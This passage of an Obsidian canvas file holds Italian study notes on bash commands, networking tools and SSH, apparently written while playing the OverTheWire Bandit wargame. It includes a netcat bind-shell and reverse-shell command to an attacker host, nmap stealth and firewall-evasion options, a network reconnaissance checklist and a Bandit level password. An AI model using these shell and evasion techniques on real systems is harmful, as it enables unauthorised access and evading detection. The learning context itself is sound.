includono la ricerca di hard link duplicati e directory vuote:\n\n```bash\nfind / -samefile /path/to/file\nfind /home -type d -empty\n```","x":4838,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"b3872fe16b478ecb","type":"text","text":"# `inodes` e `filesystem`\n\nQuesta parte, premetto, è un po' un delirio. Spero di averci capito qualcosa.\n\nUno si immagina un `filesystem` come una struttura ad albero. In realtà non è così, perché posso creare dei link che collegano diversi nodi in modo non gerarchico: è un ***grafo aciclico diretto*** (***DAG***). E come rappresento un DAG? Ovviamente con una tabella in cui salvo i nodi (che chiamo ***inodes***) e cosa fanno, e.g. puntare a dei dati (`inode` di tipo `file`), puntare a elenchi di altri `inodes` (i.e. è una `directory`) o ad un altro `inode` (e.g. un `soft link` ad un `inode` di tipo `directory`, come avviene con `bin@`).\n\nOgni `filesystem` si presenta più o meno nello stesso modo. Prendiamone uno di tipo `ext4`.\n\n```bash\n+----------------+----------------+-----------------+---------------------+\n| Superblock     | Inode Table    | Data Blocks     | Journaling          |\n| (info su FS)   | (lista inode)  | (dati reali)    | (storico modifiche) |\n+----------------+----------------+-----------------+---------------------+\n```\n\nQuesta è la struttura di un ***file a blocchi***, che rappresenta un `filesystem`.\n\n- `superblock` - contiene i metadati come la `signature` (e.g. `0xEF53` identifica la formattazione `ext4`), lo stato del `filesystem` (e.g. `clean`, nessun problema, o `error`, ci sono problemi), dimensione dei vari blocchi e informazioni per gestire gli `inodes`;\n- `inode table` - contiene la logica con cui sono organizzati i dati. Ogni `filesystem` ha un `inode` di `root` da cui parte tutto, che ha sempre `numero` identificativo `1`;\n- `data blocks` - i dati veri e propri (e.g. blocchi puntati da `inodes` di tipo `file`);\n- `journaling` - lo storico modifiche dei blocchi e degli `inodes`.\n\nOttimo, quindi Linux ha un `filesystem`! ... ecco, non è così facile. Se così fosse, eseguendo `l -i` nella `root directory /` dovrei vedere tutti numeri di `inode` distinti. Ma se dico così ovviamente non succede questo: `/dev`, `/proc`, `/run` e `/sys` hanno tutte `inode 1`. Non solo! `/proc` e `/sys` risultano occupare `0` spazio su disco!\n\n... perché?!","x":3829,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"2d903151dad0b196","type":"text","text":"# Esempi Avanzati di `find`\n\n```bash\n# Trovare file modificati negli ultimi 2 giorni e comprimerli\nfind /var/log -type f -mtime -2 -exec gzip {} \\;\n\n# Trovare e cambiare owner a tutti i file appartenenti a un utente\nfind /home -user vecchioutente -exec chown nuovoUtente:nuovoGruppo {} \\;\n\n# Trovare i 10 file più grandi nel sistema\nfind / -type f -exec du -h {} + | sort -rh | head -n 10\n\n# Trova e sposta i file più vecchi di 30 giorni in una cartella di backup\nfind /var/log -type f -mtime +30 -exec mv {} /backup/logs/ \\;\n\n# Trova ed elimina file temporanei più vecchi di una settimana\nfind /tmp -type f -name \"*.tmp\" -mtime +7 -delete\n```\n\nOra iniziamo ad entrare in cose serie.\n\n```bash\n# File posseduti da utenti inesistenti (account eliminati ma file rimasti)\nfind / -nouser -o -nogroup\n\n# Trova file con permessi pericolosi\nfind / -type f -perm 0777\n\n# Cancella tutti i log\nfind /var/log -name \"*.log\" -exec rm {} \\;\n\n# Trova tutte le cartelle a cui posso accedere e in cui posso scrivere\nfind / -type d -exec test -r {} -a -w {} \\; -print 2>/dev/null\n```","x":5847,"y":-1249,"width":759,"height":848,"color":"3"},
		{"id":"603628298b4df9a2","type":"text","text":"# Analizzare la Rete - `nmap`\n\nIn questo caso la mia ricerca parte dal fatto che volevo sapere cosa fosse il servizio sulla porta `30000` di `localhost`. L'ho capito? No, ma ci sono diverse cose interessanti.\n\n```bash\nnmap [options] [target]\n```\n\n fa una scansione delle porte aperte su `[target]` (nel nostro caso `localhost`, ci puoi mettere anche nomi che verranno risolti da `DNS`), provando a dirti che tipo di servizio offre ciascuna di esse. Puoi anche specificare\n\n- Più `[target]` separati da spazi (e.g. `localhost` `192.168.1.15` `google.com`);\n- Un intervallo di indirizzi `IP` (e.g. `192.168.1.1-100` fa uno scan dall'`host 1` al `100`);\n- Un'intera subnet (e.g. `192.168.1.0/24`).\n\nOvviamente più roba gli fai analizzare più ci mette, soprattutto se aggiungi le `[options]`:\n \n - `-pX` - Specifica le ***porte***. `X` può essere un numero (e.g. `-p 443`), un elenco di numeri (e.g. `-p 22, 80, 443`) in cui per ognuno specifico se testare `TCP` o `UDP` (e.g. `-p U:53,T:80,443`) o semplicemente un \"tutte le porte\" (`-p-`);\n\t - `--source port` permette di specificare la porta da cui faccio partire le richieste. Utile per ***bypassare i firewall*** (e.g. camuffandomi da richiesta `DNS`, porta `53`).\n - `-sX` - Specifica il ***tipo di scansione***. Non mi va di scriverle, vedi tabella e riquadri sopra. Aggiungo solo un paio di scansioni utili:\n\t - `-sV` - Riconosce servizi e versioni, spesso accoppiato con `--version-intensity X`, dove `X` definisce il rapporto `rapidità/efficienza` della scansione (da `0`, veloce ma poco affidabile, a `5`, lento ma accurato);\n\t - `-sS` - Il `SYN scan` è un altro trucco per essere stealth. Una connessione non completata ***potrebbe*** non essere salvata nei `log` di sistema.\n- `-PX` - Specifica il ***tipo di discovery*** (e.g. `-PE` è un `ping ICMP`, `-PR` è `ARP`). Se vuoi ignorare la discovery e fare uno scan di tutta la sottorete, `-Pn`.\n- `-TX` - Specifica la ***velocità*** dello scan, da `X = 0` (lentissimo, usato solo per bypassare IDS ultra-sensibili) a `5` (veloce e rumoroso, facilmente bloccato). Di default è `3`. Con `1` puoi stare abbastanza tranquillo, i `log` non dovrebbero registrarti;\n- `--script` - Permette di eseguire cose sulle porte trovate;\n- `-A` - In pratica è un \"all-in\" di molte altre opzioni (sarebbe `-O -sV --script=Default` + `traceroute`). Ovviamente è una roba rumorosissma e lentissima.","x":7866,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"c77fc76ca3f24940","type":"text","text":"# Interagire con la Rete - `nc`\n\nUn altro comando nella hall of fame dei più potenti. Di per sé è utile ad aprire connessioni, ma può fare molte cose (tanto che su alcune distribuzioni moderne è stato nerfato).\n\n```bash\nnc [options] [target]\n```\n\n- `-v [IP] [port]` apre una connessione `TCP` con il `[target]`. Funziona in modo simile a `Telnet`, posso inviare cose \"a mano\": se dall'altra parte ho un server `HTTP` posso ad esempio fare `GET / HTTP/1.1` e premere `ENTER` due volte, o come nel caso del `livello 14` magari il servizio è completamente homemade;\n\t- Se la porta è ***chiusa*** uscirà `Connection Refused`, se c'è un ***firewall*** che blocca la connessione il comando resterà bloccato, senza output;\n\t- `-v` di per sé potrei anche toglierlo (è `-verbose`), ma se lo faccio non esce scritto niente e potenzialmente non capisco cosa sta succedendo.\n- `-l -p [port]` si mette in ascolto (`-l`) sulla porta `[port]`;\n- `-u` usa `UDP` invece di `TCP`. Spesso usato per testare il `DNS` (e.g. `nc -u 192.168.1.1 53` controlla se un ipotetico default gateway è configurato come server `DNS`);\n- `-z -v [IP] [port_range]` fa una scansione simile a `nmap`. `-z` chiude la connessione subito dopo averla testata, e `-v` mostra i dettagli. `[port_range]` è `inizio-fine`;\n\t- Preferibile ad `nmap` in quanto più stealth.\n- Se la connessione non richiede autenticazione (e.g. su reti locali), posso realizzare un rapido trasferimento di file una senza usare roba tipo `FTP`. Sulla macchina ricevente predispongo un ascolto con `nc -l -p 1234 > received_file.txt`, mentre su quella che invia scrivo `cat toshare.txt | nc [IP] 1234`.\n\nOra, per quale motivo abbiamo detto che in alcune versioni `nc` viene nerfato? Il punto è che con l'opzione `-e` (`exec`) si può agilmente creare una ***backdoor***. Mi basta riuscire a far eseguire `nc -l -p 4444 -e /bin/bash` sul server, che di fatto associa alla connessione in ascolto sulla porta `4444` un terminale. Se dall'altra parte eseguo `nc -v [target IP] 4444`, tutto ***ciò che scrivo diventa l'input del terminale remoto***.\n\nSe questo non funziona (e.g. per un `firewall` restrittivo) posso usare una ***reverse shell***, i.e. fare questo stesso processo al contrario: io mi metto in ascolto in locale con `nc -l -p 4444` e faccio eseguire in remoto `nc [attacker IP] 4444 -e /bin/bash`. In questo modo è il server ad aprire una connessione verso l'esterno, il `firewall` di norma lascia passare. ","x":8875,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"ea6a4509f0ba551c","type":"text","text":"# Un Hacker si risveglia in una Rete sconosciuta...\n\nCosa fa?\n\n- ***Chi c'è nella rete?*** `nmap -sn 192.168.1.0/24` manda dei `ping` a tutta la sottorete, solo per vedere chi è attivo (non perde tempo a scansionare le porte);\n- ***Quali porte sono aperte?*** Poniamo che abbia trovato un dispositivo di suo interesse. Vediamo quali aperture offre con `nmap -p- 192.168.1.10`;\n- ***Cosa c'è dietro quelle porte?*** Abbiamo trovato aperte le porte `22`, `80` e `3306`. Ma che servizio offrono davvero? `nmap -sV -p 22,80,3306 192.168.1.10`!\n- ***Qual è il SO?*** `nmap -O 192.168.1.10`. Puoi specificargli di provare a dare una risposta anche se non ne è sicuro al $100\\%$ con `--osscan-guess`;\n- ***Possono rilevarmi?*** Di norma tutto quello che ho fatto finora lascia tracce nei log. Se arrivato a questo punto ho intenzione di fare cose un po' più sporche dovrei pormi il problema di non farmi rilevare. Posso sia rallentare lo scan (e.g. `-T1`) che evitare di chiudere le connessioni (e.g. `-sS`, così non mando l'`ACK` finale);\n- ***E se c'è un Firewall?*** Devo intanto capire se c'è. In genere tendono a bloccare tutti i pacchetti di connessioni non già aperte, quindi posso provare a mandare un `ACK` invece di un `SYN` (`nmap -sA 192.168.1.1`). In teoria questo gli farà pensare che è parte di una connessione già aperta, lasciandolo passare. Se invece viene bloccato anche così, significa che il `firewall` è forte ed è più difficile da ingannare;\n\t- Ci sono poi tecniche più nerd per evadere il `firewall`, tipo frammentare i pacchetti (`-f`), cambiare la dimensione dei pacchetti (e.g. `-mtu 16`) o aggiungere dati casuali per eludere pattern di rilevamento noti (e.g. `--data-length 50`).\n- ***Ci sono vulnerabilità?*** `nmap` prevede la possibilità di testare vulnerabilità note con la direttiva `--script=XXX`, dove `XXX` può essere un tot di cose che cercherai se servono.","x":7866,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"0e6f99d9025a7954","type":"text","text":"# `openssl`\n\nUna roba per gestire e controllare i ***certificati***, nonché per ***crittare e decrittare*** messaggi.\n\n```bash\nopenssl [sub_command] [options]\n```\n\ndove chiaramente le `[options]` dipendono dal `[sub_command]`.\n\n- ***Gestione delle Chiavi*** - Usa `SSL/TLS` per le chiavi di cifratura (e.g. `openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048` genera una chiave privata `RSA`, e `openssl rsa -in private.key -pubout -out public.key` ne estrae la corrispondente chiave pubblica);\n- ***Gestione dei Certificati*** - <span style=\"color:rgb(236, 155, 14)\">Non mi va di scrivere sta roba, torna qui se serve.</span>\n\t- Un certificato ***SnakeOil*** è simpaticamente un modo per indicare gli autofirmati;\n- ***Connessione Crittata*** - Posso connettermi ad un server `SSL/TLS` lato client eseguendo `openssl s_client -connect [IP]:[port]`. Questo apre una connessione su CLI in stile `telnet`/`nc`, sulla quale tutto ciò che invio viene crittografato;\n\t- Con cosa? In fase di `handshaking`, il `client` invia una lista di cifrari supportati. Tra questi, il `server` sceglie il suo preferito;\n\t- In alternativa posso specificare quale voglio usare con `-cipher [algoritmo]`, ma a quel punto la domanda diventa: il `server` lo accetta? Diciamo che se sono io a configurarlo posso dirglielo, sempre con `-cipher`.","x":7866,"y":2118,"width":759,"height":951,"color":"3"},
		{"id":"7b351e91b16f865e","type":"text","text":"# Level 0\n\nLa password per il livello 1 si trova banalmente nel file `readme` del livello 0:\n\n```\nZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n```\n\nQuando fai `exit`, `SSH` ti avvisa se stai lasciando processi `running` o `stopped` (`CTRL + Z`). Se compare un `There are stopped/running jobs`, per non lasciare processi orfani fai\n\n```\nkill -9 $(jobs -p)\n```","x":-207,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"0f2a36c9dcf84a3e","type":"text","text":"# Linux `Bash` Commands (Bandit)\n\nApprofonditi in ordine di come compaiono in [Bandit](https://overthewire.org/wargames/bandit/bandit0.html) e di come mi gira.\n\nSi accede al livello `N` del gioco loggando in `ssh` all'`host` `bandit.labs.overthewire.org` mettendo come `user` `banditN` e come `password` quella ottenuta al livello `N-1`.\n\nLa sia username che password del livello zero sono `bandit0`. Nel seguito, il riquadro `Level N` contiene la soluzione per trovare la password del livello `N`.","x":-1216,"y":1296,"width":759,"height":319,"color":"6"},
		{"id":"f4f2a29153e51075","type":"text","text":"# Bash - Utility\n\n- `man [comando]` - Restituisce le istruzioni per il `comando`. Ha una vecchia versione basata su text editor chiamata `info`;\n- `apropos [pattern]` - Restituisce tutti i comandi che contengono `[pattern]` nella `SYNOPSIS` del manuale `man` (e.g. se voglio un comando che registra qualcosa potrei cercare `apropos capture`). Utile anche per capire quali comandi sono installati in una `shell` remota, o se ti ricordi cosa fa il `comando` ma non il nome;\n- `alias` - Restituisce tutti gli `alias`, definizioni homemade di comandi con diverse opzioni (e.g. `alias ll='ls -alF'`, i.e. se scrivo `ll` il terminale legge `ls -alf`);\n- `wc` - Restituisce il numero di  righe (`-l`), parole (`-w`) o `byte` (`char`, `-c`) di un `file1`. Se non specifico nessuna opzione, restituisce tutte queste cose in quest'ordine;\n- `du` - Disk Utilization della directory. Tipicamente utilizzato con opzioni `-ah` (restituisce il peso in formato leggibile di tutti i file della directory) o `-sh` (per le sole directory);\n- `sort` - Restituisce le righe di input in ordine lessicografico. Posso specificare `-n` (ordinamento numerico), `-r` (ordine inverso), `-u` (elimina i duplicati<span style=\"color:rgb(236, 155, 14)\">, in teoria, perché a me non ha mai funzionato</span>), `-k N` (ordina secondo la colonna `N`);\n- `strings` - Converte il contenuto di un file in stringhe stampabili;\n- `uniq` - Rimuove righe duplicate ***consecutive*** (quindi si usa spesso dopo `sort`). `-u` mostra solo le righe uniche, `-d` solo quelle duplicate, `-c` conta le occorrenze;\n\t- A me funziona solo come `sort data.txt | strings | uniq -u` (cfr. `livello 8`).\n- ","x":-2225,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"430d8b04ba92b85a","type":"text","text":"# Espansioni Condizionali  e di Comandi \n\nNota che le graffe possono essere usate anche per ***espandere i comandi***. Se ad esempio vuoi eseguire `comando 2` ***e*** `comando 3` sse fallisce `comando 1` devi scrivere\n```bash\ncomando 1 || { comando 2 && comando 3; }\n```\n\nNota anche gli spazi tra le graffe e i comandi, altrimenti `bash` si arrabbia.\n","x":-3234,"y":2117,"width":759,"height":246,"color":"4"},
		{"id":"eab759960ddcf808","type":"text","text":"# Attaccare SSH\n\nPartiamo da un presupposto: se il server è configurato bene, è tendenzialmente difficile.\n\nNelle opzioni di configurazione, `sshd_config` può prevedere un numero massimo di tentativi da un certo `IP` (`MaxAuthTries`), oltre il quale un sistema come `fail2ban` può bannare il tuo `IP` (i.e. non accettare più alcun tentativo da parte tua).\n\nQuesto chiaramente presuppone che tu stia facendo brute force su una password debole. È però possibile che l'`host` accetti solo autenticazione con chiavi asimmetriche, rendendo di fatto qualsiasi attacco impossibile (a meno che non fai tipo MitM al momento dello scambio di chiavi, ma stiamo parlando di cose complicate).\n\nSe sei già dentro al sistema, potresti voler trovare le `password` di altri `user`. Questo si riduce a un meccanismo di hacking interno alla macchina, per cui dovresti avere i permessi per accedere a `/bin/shadow` e usare un tool come `hashcat` o `john` per risalire ai dati a partire dagli hash (cosa notoriamente difficile).","x":-1216,"y":-1038,"width":759,"height":439,"color":"4"},
		{"id":"4282f1f0f685c1b7","type":"text","text":"# `ssh-keygen` e Chiavi Asimmetriche\n\nSe non ti va di mettere la password ad ogni connessione (anche perché mandarla ogni volta in giro su Internet è una potenziale vulnerabilità) puoi creare una ***coppia di chiavi*** con il comando ***`ssh-keygen`*** e copiare la chiave pubblica sulla macchina remota con `ssh-copy-id user@host`. La scrittura più generale possibile è`ssh-keygen [opzioni] -t <algoritmo> [opzioni dell'algoritmo]`, dove\n\n- le `[opzioni]` includono `-f <file>` (specifica il file di output in cui vengono salvate le chiavi), `-C \"comment\"` (inserisce un commento, tipo \"`Chiave per GitHub`\"), `-N \"passphrase\"` (protegge l'accesso alla chiave privata), `-q` (modalità \"silenziosa\") e `-y` (data una chiave privata, ne estrae la pubblica);\n- `-t <algoritmo>` è in realtà facoltativo (in assenza di specifica si usa ***RSA*** con chiave a `3072 bit`), ma si usa in genere ***ed25519***, che rappresenta un buon compromesso tra sicurezza e velocità;\n- le `[opzioni dell'algoritmo]` si riducono di norma alla lunghezza della chiave (`-b`), ma ad esempio `ed25519` usa sempre chiavi a `256 bit`.\n\nLe chiavi private vengono salvate di default in `~/.ssh`, dove posso creare e settare un file `config` per specificare quale chiave usare per quale server (altrimenti, in modo molto poco furbo, `ssh` le prova tutte!).\n\n```\nHost mio-server\n    HostName server.example.com\n    User utente\n    IdentityFile ~/.ssh/mia_chiave\n```","x":-1216,"y":-30,"width":759,"height":686,"color":"4"},
		{"id":"8603be4ae948e472","type":"text","text":"# Opzioni Furbe\n\nLe `[options]` di `ssh` sono in realtà uno strumento molto potente.\n\n- `-N -f -q -L` - ha senso usarli insieme: `-N` apre una connessione senza terminale, e uno si potrebbe chiedere \"ma allora a che serve?\". Ecco perché parliamo anche di `-L`, che fa ***port forwarding*** dalle mie porte locali a quelle dell'host remoto. Cioè?\n\t- `-L <porta_locale>:<host_remoto>:<porta_remota>` si comporta così: quando arriva un qualcosa alla mia `porta_locale`, questo qualcosa viene reindirizzato direttamente alla `porta_remota` dell'`host_remoto`;\n\t\t- Nota che `host_remoto` potrebbe non essere l'`host` con cui ho stabilito la connessione `ssh`! Con `ssh -L 3306:192.168.1.50:4070 user@host` sto dicendo \"`Ciao host, mo' io ti mando qualsiasi cosa arrivi sulla mia porta 3306, tu devi girare tutto a 192.168.1.50:4070 (dal tuo punto di vista, i.e. come se fossi tu a mandarla). Come? Boh, veditela tu`\";\n\t\t- Di norma sta roba si usa per accedere ad un qualche servizio dal punto di vista di `host`, quindi scrivendo `ssh -L 3306:localhost:3307 user@host`. In pratica così sto dicendo una roba del tipo `Devi fare una roba per me, ti inoltro tutto ciò che passa sulla mia porta 3306 alla tua porta 3307` (***`localhost`*** è un placeholder per l'indirizzo di ***loopback*** `127.0.0.1`);\n\t- `-N` evita di aprire il terminale, quindi fa consumare meno risorse all'`host`, mentre `-f` mette il processo in ***background***;\n\t\t- Uno potrebbe pensare che così si guadagna in privacy, ma non è vero. Il processo resta visibile ad un comando `ps aux`, anche se si può provare a limitare la quantità di log registrati tramite la ***quiet mode*** (`-q`).\n\t- `-L` ha anche l'opzione inversa: `-R a:localhost:b` significa che tutto ciò che arriva all'`host` sulla porta remota `a` viene mandato alla mia macchina sulla porta `b`.\n- `-D` - Configura un ***proxy SOCKS***, i.e. un proxy che opera a livello di trasporto. Questo gli permette di inoltrare dati senza fare le solite porcate che fanno i proxy `HTTP` (e.g. filtrare il traffico, o spiarlo), nonché di inoltrare qualsiasi tipo di richiesta. `ssh -D 8080 user@host` sta dicendo ad `host` che quando arrivano richieste da me, lui deve mandarle su Internet come se venissero da lui. ","x":-207,"y":-1250,"width":759,"height":848,"color":"4"},
		{"id":"22dfa299c258426a","type":"text","text":"# SSH - `ssh [options] user@host`\n\n***Secure Shell*** usa di norma la  ***porta 22*** per connettere il proprio terminale ad un terminale remoto eseguito come `user` all'indirizzo `host` (che può sia essere un indirizzo `IP` sia un nome, che verrà in caso risolto da DNS).\n\nQuesto non significa che puoi entrare a caso nei sistemi altrui. Il campo `user` deve essere un utente registrato su quell'`host`, e ti verrà richiesta la sua `password`.\n\nLe opzioni di base includono\n\n- `-p 1234` - si connette alla porta `1234` invece che alla `22`;\n- `-i </path/to/key>` - specifica che chiave usare per la connessione;\n- `-T` - usalo se vuoi eseguire solo un comando (concatenato come \"`ssh -T user@host 'comando'`\" e poi chiudere la connessione, senza aprire una shell interattiva;\n- `-X` - se vuoi avviare applicazioni con una GUI X11 sull'`host` remoto, questa opzione ti permette di visualizzare tale GUI sul tuo computer (risultato simile si ottiene con `-Y`, che ha meno restrizioni di sicurezza e in genere si usa se `-X` non funziona).\n\nUna sessione funzionante si termina con `exit` o `CTRL + D`, una \"rotta\" con `~.` (senza poi premere invio!), altrimenti killando il processo `ssh` da un altro terminale (se proprio devi).","x":-207,"y":45,"width":759,"height":536,"color":"6"},
		{"id":"e660a0288c5cee37","type":"text","text":"# Sì ok, ma che è il `Bash`?\n\nUna ***shell*** è un interprete dei comandi dell'utente verso il SO: se vuoi dire qualcosa al cuore del tuo computer devi parlare il suo linguaggio, o in alternativa un linguaggio che qualcuno (i.e. la shell) traduce in comandi comprensibili per il SO.\n\nNel tempo sono state create diverse `shell`, a cui corrispondono diversi linguaggi. ***Bash*** (***Bourne Again Shell***) è un'evoluzione della prima `shell`, chiamata ***sh*** (***Bourne Shell***, che è il tizio che l'ha sviluppata). In mezzo ci sta un tot di roba, in parte ancora utilizzata (e.g. `ksh`) e in parte caduta nell'oblio (e.g. `csh`).\n","x":-2225,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"c61155df72f8f47a","type":"text","text":"# Expansions & History\n\n\nSalto le cose che so e ne scrivo due che non sapevo.\n\n- ***Expansions*** - `Bash` ti consente di creare shortcut per varie cose:\n\t- ***Brace Expansion*** - Tratta il contenuto di parentesi graffe `{}` come una lista:\n\t\t- `file{1,2,3}.txt` $\\to$ `file1.txt file2.txt file3.txt`;\n\t\t- `{a..f}` $\\to$ `a b c d e f`;\n\t\t- `{001..005}` $\\to$ `001 002 003 004 005`;\n\t\t- `{a..z..2}` $\\to$ `a c e g i ...` (espande con passo `2`);\n\t\t- `{A,B}{1,2,3}` $\\to$ `{A1 A2 A3 B1 B2 B3}` (fa il prodotto cartesiano).\n\t- ***Tilde Expansion*** - Quando `Bash` vede `~` lo espande nella `home directory` dell'utente corrente;\n\t- ***Parameter Expansion*** - Espande le variabili, e.g. `$HOME` $\\to$ `/home/user`;\n\t\t- Si possono mettere dentro robe condizionali\n\t- ***Command Substitution*** - `$(comando)` esegue il `comando` ed usa il suo output (si può fare anche con le `backtick`); \n\t- ***Arithmetic Expansion*** - `$((algebra))` esegue l'`algebra` ed usa il suo output;\n\t- ***Word Splitting*** - Dato `LIST=\"1 2 3\"`, ci sono due comportamenti di default:\n\t\t- `$LIST` splitta l'output, ovvero `1`, `2` e `3` sono entità separate;\n\t\t- `\"$LIST\"` conserva la struttura non splittata di stringa.\n\t- ***Pathname Expansion*** - Nell'indicare il nome di un file, posso usare `*` per indicare qualsiasi numero di qualsiasi caratteri, `?` per intendere un carattere qualsiasi, `[abc]` (***wildcard expansion***) per indicare una qualsiasi tra le lettere `a`, `b` e `c` e `{a,b,c}` (come in precedenza) per indicarle tutte.\n- ***History*** - `Bash` tiene traccia di quello che fai, ma oltre ad andare su e giù tra i comandi con le frecce puoi fare molto di più:\n\t- `history` visualizza tutti i comandi eseguiti, numerandoli riga per riga;\n\t- `!!` ripete l'ultimo comando eseguito;\n\t- `!n` esegue il comando `n` nella lista di `history`;\n\t- `!ssh` esegue l'ultimo comando nella `history` che inizia per `ssh`;\n\t- Se sbaglio a scrivere un comando, posso correggerlo con `^errore^correzione`;\n\t- `!$` espande l'argomento del precedente comando (e.g. `mkdir mydir; cd !$`).","x":-3234,"y":1008,"width":759,"height":894,"color":"4"},
		{"id":"1cdecb81c364493b","type":"text","text":"# Sono Dentro! Ora Cosa Faccio?\n\nBene, sono entrato in `ssh`. Sì, ma dove?\n\n- ***Kernel e SO*** - Posso stampare un riassunto con `uname -a`, che mostra \n\t- `nome_kernel`, e.g. `Linux`;\n\t- `hostname`, e.g. `my_pc`;\n\t- `versione_kernel`, e.g. `5.15.0-91-generic` (`generic` è la versione di Ubuntu);\n\t- `numero_build`, i.e. quante volte il kernel è stato ricompilato. In che senso? Quelli che distribuiscono il SO (e.g. ***Canonical*** per Ubuntu) non si mettono a firmare nuove versioni ad ogni minimo fix. Un aggiornamento minore (eseguito con `apt upgrade`) può includere una modifica al kernel ed una conseguente ricompilazione, che incrementa solo il numero di build, e.g. `#102-Ubuntu SMP Fri Jan 5 12:06:54 UTC 2024` (di norma ti dice anche quando è stato ricompilato l'ultima volta);\n\t\t- Se so che nella build `#102` c'è una ***vulnerabilità*** nota che è stata fixata solo successivamente (e.g. nella `#105`, l'ultima), posso sfruttarla per fare robe;\n\t\t- Se poi sono molto interessato a queste cose, con `cat /proc/version` trovo anche i dettagli sul tipo di compilatore usato.\n\t- `architettura`, e.g. `x86_64`;\n\t- `SO`, e.g. `GNU/Linux`;\n\t\t- Se mi interessa la distribuzione specifica del kernel, `cat /etc/os-release`. Questo in genere serve per capire la compatibilità dei SW che vuoi usare.\n- ***Chi sono io?*** - Potrei essere interessato a capire in qualità di che utente sono loggato.\n\t- `whoami` - Restituisce il nome dell'utente attuale (in teoria dovrei saperlo, se sono entrato con `ssh` dovrebbe coincidere con l'`user`);\n\t\t- <span style=\"color:rgb(236, 155, 14)\">Sono un utente standard o un account di servizio?</span> `cat /etc/passwd | grep $(whoami)` restituisce le righe del file `passwd` in cui compare il mio `user`. <span style=\"color:rgb(236, 155, 14)\">Se vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.</span>\n\t- `id` - L'`user` è solo una label. Il SO mi identifica con un numero, detto ***UID***;\n\t\t- `0` corrisponde a `root`, `1-999` sono in genere utenti di sistema (e.g. servizi, demoni, ...) e `1000+` sono utenti normali;\n\t\t- Posso specificare `id -u mario` per sapere l'`UID` dell'utente `mario`;\n\t\t- A questo utente saranno associati anche dei gruppi, pertanto l'output di `id` sarà una lista `#id(group)` dove `#id` è il numero associato alla label `group`.\n- ***Chi sono gli altri?*** - Chi altro è loggato, e cosa sta facendo?\n\t- `who` e `w` permettono di vedere, rispettivamente, queste due cose;\n\t- `last` è uno storico degli accessi <span style=\"color:rgb(236, 155, 14)\">SSH</span>;\n- ***Cosa posso fare?*** - Per capirlo, mi serve sapere quali sono i miei privilegi. ","x":-207,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"e218e0589f82e95a","type":"text","text":"# Premesse - Sistemi Operativi II","x":-1216,"y":4000,"width":759,"height":240,"color":"6"},
		{"id":"26065c6695f63b89","type":"text","text":"# Proprietari e Permessi\n\nQuando usi l'opzione `-l` in `ls` ci stanno diverse cose in output.\n```bash\n-rw-r--r-- 1 alice users 1234 Feb 21 12:00 file.txt\n```\n\n- Il primo `-` dell'esempio indica il tipo di `inode`, e può assumere gli stessi valori che specifico in una richiesta `-type` nel comando `find`;\n- I successivi `9` caratteri rappresentano i ***permessi*** per il ***proprietario*** (`alice`), per il ***gruppo*** (`users`) e, infine, per tutti gli ***altri*** (i.e. che non sono né `owner` né `group`);\n- Seguono numero di ***hard links***, dimensione, ultima modifica e nome del file.\n\nOgni gruppo di tre lettere (`rwx`) può essere rappresentato da una stringa binaria che ci dice cosa è attivo e cosa no (e.g. `101` $\\to$ `r-x`), ma possiamo ulteriormente comprimere questa informazione traducendola in decimale (e.g. `r-x` $\\to$ `101` $\\to$ `5`). Per questo, i permessi sono generalmente indicati con tre numeri da `0` a `7`.\n\nPosso modificare:\n\n- i permessi, con `chmod [perm] [file]`, dove `[perm]` può essere sia una sacra triade ottale come vista prima (e.g.  `755`) o singole aggiunte/rimozioni come `u+x` (aggiunge il permesso di esecuzione al proprietario), `g-w` (toglie la scrittura al gruppo) o `o+r` (aggiunge la lettura a `others`);\n\t- ***Solo il proprietario e root*** possono usare `chmod`, indipendentemente dai permessi di scrittura attuali (modificare i permessi non conta come scrittura sul `file`).\n- il proprietario e il gruppo, con `chown new_owner:new_group [file]`. `:new_group` è opzionale, posso cambiare solo lui con `chgrp`.\n\t- ***Solo root*** può usare `chown`.","x":2820,"y":-1249,"width":759,"height":848,"color":"6"},
		{"id":"5cce19db2eacb68d","type":"file","file":"nmap_option_s.png","x":6857,"y":-818,"width":759,"height":417},
		{"id":"0ab6e3f18680f1a9","type":"text","text":"curl, watch, fc, ","x":6927,"y":-1409,"width":620,"height":320,"color":"1"},
		{"id":"14bf4627959145d2","type":"text","text":"\n# **📊 `awk` - Il Coltellino Svizzero per Dati Testuali**\n\n`awk` è un linguaggio di scripting integrato nei sistemi Unix/Linux, usato per **analizzare, manipolare e trasformare** dati tabellari (testo strutturato in colonne).\n\n### **📌 Uso base**\n\n```bash\nawk '{print $1}' file.txt\n```\n\nStampa la **prima colonna** di ogni riga del file `file.txt`.\n\n### **📌 Opzioni avanzate**\n\n|Comando|Descrizione|\n|---|---|\n|`awk '{print $1, $3}' file.txt`|Stampa **prima e terza colonna**.|\n|`awk '/error/ {print $0}' log.txt`|Stampa le righe contenenti `\"error\"`.|\n|`awk -F: '{print $1}' /etc/passwd`|Usa `:` come separatore per estrarre i nomi utente.|\n|`awk '{sum += $2} END {print sum}' dati.txt`|Somma tutti i valori della **seconda colonna**.|\n|`awk 'NR==5' file.txt`|Stampa **solo la quinta riga**.|\n|`awk '{print NR, $0}' file.txt`|**Numera** ogni riga e la stampa.|\n\n### **🛠️ Trucchi da Hacker**\n\n1️⃣ **Trovare gli utenti con UID < 1000:**\n\n```bash\nawk -F: '$3 < 1000 {print $1, $3}' /etc/passwd\n```\n\n2️⃣ **Elencare i processi e la memoria che consumano:**\n\n```bash\nps aux | awk '{print $1, $2, $4 \"%\"}'\n```\n\n3️⃣ **Contare il numero di occorrenze di una parola in un file:**\n\n```bash\ngrep \"error\" log.txt | awk '{count++} END {print count}'\n```\n\n4️⃣ **Estrarre le richieste HTTP GET da un file di log:**\n\n```bash\nawk '$6 == \"\\\"GET\"' 